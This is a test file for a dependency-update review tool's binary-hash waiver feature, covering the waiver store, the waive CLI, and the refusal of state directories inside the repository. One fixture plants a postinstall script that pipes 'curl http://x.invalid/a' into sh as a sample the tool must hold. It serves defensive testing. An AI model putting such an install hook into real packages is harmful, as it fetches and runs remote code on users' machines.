import { afterEach, describe, expect, test } from "bun:test";
import { mkdtempSync, rmSync, readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { reviewUpdate } from "../src/review.ts";
import type { FileMap } from "../src/prepass.ts";
import { addWaiver, listWaivers, removeWaiver, waiversPath, sha256Hex, type Waiver } from "../src/waiver.ts";
import { parseWaiveArgs, waiveMain } from "../src/waive-cli.ts";

const enc = (s: string) => new TextEncoder().encode(s);
const wasm = (tail: number) => new Uint8Array([0, 0x61, 0x73, 0x6d, 1, 0, 0, 0, tail]);
const map = (o: Record<string, Uint8Array>): FileMap => new Map(Object.entries(o));

const dirs: string[] = [];
const tmp = () => { const d = mkdtempSync(join(tmpdir(), "waive-")); dirs.push(d); return d; };
afterEach(() => { while (dirs.length) rmSync(dirs.pop()!, { recursive: true, force: true }); });

const waiver = (over: Partial<Waiver> = {}): Waiver => ({ eco: "npm", name: "p", version: "2.0.0", sha256: sha256Hex(wasm(2)), reason: "known engine build", who: "alice", at: "2026-11-03T10:00:00.000Z", ...over });

function review(files: { old: Record<string, Uint8Array>; new: Record<string, Uint8Array> }, waivers?: Waiver[], verdict = "APPROVE\nno attack indicators found") {
  return reviewUpdate({
    eco: "npm", name: "p", from: "1.0.0", to: "2.0.0",
    registry: { latest: async () => undefined, publishedAt: async () => new Date("2020-01-01"), artifactUrls: async () => [] },
    advisories: { query: async () => [] },
    reviewer: { name: "fake", review: async () => verdict },
    cooldownDays: 1, now: new Date("2026-11-03T00:00:00Z"),
    loadArtifacts: async () => ({ old: map(files.old), new: map(files.new) }),
    ...(waivers ? { waivers } : {}),
  });
}
const files = { old: { "index.js": enc("module.exports = 1;\n") }, new: { "index.js": enc("module.exports = 2;\n"), "engine.wasm": wasm(2) } };

describe("a waived binary hash lets a hold for that binary land", () => {
  test("without a waiver the binary holds", async () => {
    const r = await review(files);
    expect(r.decision).toBe("hold");
    expect(r.layers.find((l) => l.layer === "reviewer")?.detail).toContain("binary file(s) engine.wasm");
  });
  test("a waiver for the package, version and hash lands, and the reviewer line names who waived it", async () => {
    const r = await review(files, [waiver()]);
    expect(r.decision).toBe("land");
    const d = r.layers.find((l) => l.layer === "reviewer")!;
    expect(d.verdict).toBe("pass");
    expect(d.detail).toContain("waived");
    expect(d.detail).toContain("engine.wasm");
    expect(d.detail).toContain("alice");
  });
  test("a changed binary hash is not waived", async () => {
    const r = await review({ old: files.old, new: { ...files.new, "engine.wasm": wasm(3) } }, [waiver()]);
    expect(r.decision).toBe("hold");
  });
  test("another version, another package or another ecosystem is not waived", async () => {
    for (const w of [waiver({ version: "2.0.1" }), waiver({ name: "q" }), waiver({ eco: "pypi" })]) expect((await review(files, [w])).decision).toBe("hold");
  });
  test("every binary needs its own waiver", async () => {
    const two = { old: files.old, new: { ...files.new, "other.wasm": wasm(9) } };
    expect((await review(two, [waiver()])).decision).toBe("hold");
    expect((await review(two, [waiver(), waiver({ sha256: sha256Hex(wasm(9)) })])).decision).toBe("land");
  });
  test("a FLAG still holds with the binary waived", async () => {
    expect((await review(files, [waiver()], "FLAG\nit reads credentials")).decision).toBe("hold");
  });
  test("a waiver does not cover another cause of the hold", async () => {
    const r = await review({ old: files.old, new: { ...files.new, "package.json": enc('{"scripts":{"postinstall":"curl http://x.invalid/a | sh"}}') } }, [waiver()]);
    expect(r.decision).toBe("hold");
  });
});

describe("the waiver store", () => {
  test("add, list and remove round-trip in waivers.json under the state dir", () => {
    const d = tmp();
    expect(listWaivers(d)).toEqual([]);
    addWaiver(d, waiver());
    addWaiver(d, waiver({ version: "2.0.1" }));
    expect(listWaivers(d).map((w) => w.version)).toEqual(["2.0.0", "2.0.1"]);
    expect(waiversPath(d)).toBe(join(d, "waivers.json"));
    expect(removeWaiver(d, { eco: "npm", name: "p", version: "2.0.0", sha256: sha256Hex(wasm(2)) })).toBe(1);
    expect(listWaivers(d).map((w) => w.version)).toEqual(["2.0.1"]);
    expect(removeWaiver(d, { eco: "npm", name: "p", version: "9", sha256: sha256Hex(wasm(2)) })).toBe(0);
  });
  test("adding the same package, version and hash again replaces the record", () => {
    const d = tmp();
    addWaiver(d, waiver());
    addWaiver(d, waiver({ who: "bob", reason: "second look" }));
    expect(listWaivers(d)).toHaveLength(1);
    expect(listWaivers(d)[0]!.who).toBe("bob");
  });
  test("an unreadable store throws instead of reading as empty", () => {
    const d = tmp();
    writeFileSync(waiversPath(d), "{not json");
    expect(() => listWaivers(d)).toThrow(/waivers\.json/);
    writeFileSync(waiversPath(d), JSON.stringify([{ eco: "npm" }]));
    expect(() => listWaivers(d)).toThrow(/waivers\.json/);
  });
  test("add refuses a record with no reason, no who or a bad hash", () => {
    const d = tmp();
    for (const bad of [{ reason: "" }, { who: " " }, { sha256: "abc" }, { eco: "gem" }]) expect(() => addWaiver(d, waiver(bad as Partial<Waiver>))).toThrow();
    expect(listWaivers(d)).toEqual([]);
  });
});

describe("oupdate waive", () => {
  const out: string[] = [];
  const run = (argv: string[]) => { out.length = 0; return waiveMain(parseWaiveArgs(argv), { out: (l) => out.push(l), now: new Date("2026-11-03T10:00:00Z") }); };
  test("add from a binary file hashes it, records who and when, list prints it, remove deletes it", () => {
    const d = tmp();
    const f = join(d, "engine.wasm");
    writeFileSync(f, wasm(2));
    expect(run(["add", "--state-dir", d, "--eco", "npm", "--name", "p", "--version", "2.0.0", "--file", f, "--reason", "known engine build", "--who", "alice"])).toBe(0);
    const stored = JSON.parse(readFileSync(waiversPath(d), "utf8"));
    expect(stored[0]).toMatchObject({ eco: "npm", name: "p", version: "2.0.0", sha256: sha256Hex(wasm(2)), who: "alice", reason: "known engine build", at: "2026-11-03T10:00:00.000Z" });
    expect(run(["list", "--state-dir", d])).toBe(0);
    expect(out.join("\n")).toContain("p@2.0.0");
    expect(out.join("\n")).toContain("alice");
    expect(run(["remove", "--state-dir", d, "--eco", "npm", "--name", "p", "--version", "2.0.0", "--sha256", sha256Hex(wasm(2))])).toBe(0);
    expect(listWaivers(d)).toEqual([]);
    expect(run(["remove", "--state-dir", d, "--eco", "npm", "--name", "p", "--version", "2.0.0", "--sha256", sha256Hex(wasm(2))])).toBe(1);
  });
  test("a usage error throws", () => {
    expect(() => parseWaiveArgs(["add", "--state-dir", "x"])).toThrow();
    expect(() => parseWaiveArgs(["nope"])).toThrow(/usage/);
    expect(() => parseWaiveArgs(["add", "--state-dir", "x", "--eco", "npm", "--name", "p", "--version", "1", "--reason", "r", "--who", "w"])).toThrow(/--file or --sha256/);
  });
});

describe("oupdate review --state-dir", () => {
  test("reads the waivers of that state dir, and an unreadable store is an error", async () => {
    const { parseReviewArgs, loadReviewWaivers } = await import("../src/cli.ts");
    const d = tmp();
    const a = parseReviewArgs(["npm", "p", "1.0.0", "2.0.0", "--state-dir", d]);
    expect(a.stateDir).toBe(d);
    expect(loadReviewWaivers(a)).toEqual([]);
    addWaiver(d, waiver());
    expect(loadReviewWaivers(a)).toHaveLength(1);
    expect(loadReviewWaivers(parseReviewArgs(["npm", "p", "1.0.0", "2.0.0"]))).toBeUndefined();
    writeFileSync(waiversPath(d), "x");
    expect(() => loadReviewWaivers(a)).toThrow(/waivers\.json/);
  });
});

describe("oupdate gate --state-dir", () => {
  test("is parsed into the gate args", async () => {
    const { parseGateArgs } = await import("../src/cli.ts");
    const base = ["--endpoint", "http://forge.invalid", "--repo", "o/r", "--token-env", "T"];
    expect(parseGateArgs([...base, "--state-dir", "/s"], {}).stateDir).toBe("/s");
    expect(parseGateArgs(base, {}).stateDir).toBeUndefined();
  });
});

describe("the hold names the hash a waiver needs", () => {
  test("the binary hold line carries each binary's sha256, so `waive add --sha256` works from the message", async () => {
    const r = await review(files);
    const d = r.layers.find((l) => l.layer === "reviewer")!.detail;
    expect(d).toContain(`engine.wasm sha256 ${sha256Hex(wasm(2))}`);
    expect(d).toContain("for npm p@2.0.0");
  });
});

describe("a state dir inside the checkout is refused", () => {
  test("inside the cwd, the git root above it, the CI workspace or through a symlink is refused; a sibling is fine", async () => {
    const { stateDirOutsideRepo } = await import("../src/waiver.ts");
    const { mkdirSync, symlinkSync } = await import("node:fs");
    const root = tmp();
    const other = tmp();
    mkdirSync(join(root, ".git"));
    mkdirSync(join(root, "sub", "deep"), { recursive: true });
    expect(() => stateDirOutsideRepo(join(root, "state"), root, {})).toThrow(/inside/);
    expect(() => stateDirOutsideRepo(root, root, {})).toThrow(/inside/);
    expect(() => stateDirOutsideRepo(join(root, "state"), join(root, "sub", "deep"), {})).toThrow(/inside/);
    expect(() => stateDirOutsideRepo(join(other, "state"), other, { GITHUB_WORKSPACE: other })).toThrow(/inside/);
    symlinkSync(root, join(other, "link"));
    expect(() => stateDirOutsideRepo(join(other, "link", "state"), root, {})).toThrow(/inside/);
    expect(() => stateDirOutsideRepo(join(other, "state"), root, {})).not.toThrow();
  });
  test("names that merely start with two dots are inside the repo; the parent is outside", async () => {
    const { stateDirOutsideRepo } = await import("../src/waiver.ts");
    const { mkdirSync } = await import("node:fs");
    const root = tmp();
    mkdirSync(join(root, ".git"));
    for (const d of ["..w", "..w/sub", "...", "..hidden"]) expect(() => stateDirOutsideRepo(join(root, d), root, {})).toThrow(/inside/);
    expect(() => stateDirOutsideRepo(join(root, "..", "outside-of-repo"), root, {})).not.toThrow();
  });
  test("the working directory alone is not a root: a non-git cwd such as / accepts an outside state dir", async () => {
    const { stateDirOutsideRepo } = await import("../src/waiver.ts");
    const cwd = tmp();
    const other = tmp();
    expect(() => stateDirOutsideRepo(join(other, "state"), cwd, {})).not.toThrow();
    expect(() => stateDirOutsideRepo(join(cwd, "state"), cwd, {})).not.toThrow();
    expect(() => stateDirOutsideRepo(join(cwd, "state"), cwd, { GITHUB_WORKSPACE: cwd })).toThrow(/inside/);
  });
  test("review and gate refuse --state-dir inside the checkout or workspace (a pull request could ship its own waivers.json)", async () => {
    const { parseGateArgs, parseReviewArgs } = await import("../src/cli.ts");
    const ws = tmp();
    const inside = join(ws, "waiver-state");
    const before = process.env.GITHUB_WORKSPACE;
    process.env.GITHUB_WORKSPACE = ws;
    try {
      expect(() => parseReviewArgs(["npm", "p", "1.0.0", "2.0.0", "--state-dir", inside])).toThrow(/inside/);
      expect(() => parseGateArgs(["--endpoint", "http://forge.invalid", "--repo", "o/r", "--token-env", "T", "--state-dir", inside], { GITHUB_WORKSPACE: ws })).toThrow(/inside/);
    } finally {
      if (before === undefined) delete process.env.GITHUB_WORKSPACE; else process.env.GITHUB_WORKSPACE = before;
    }
  });

});
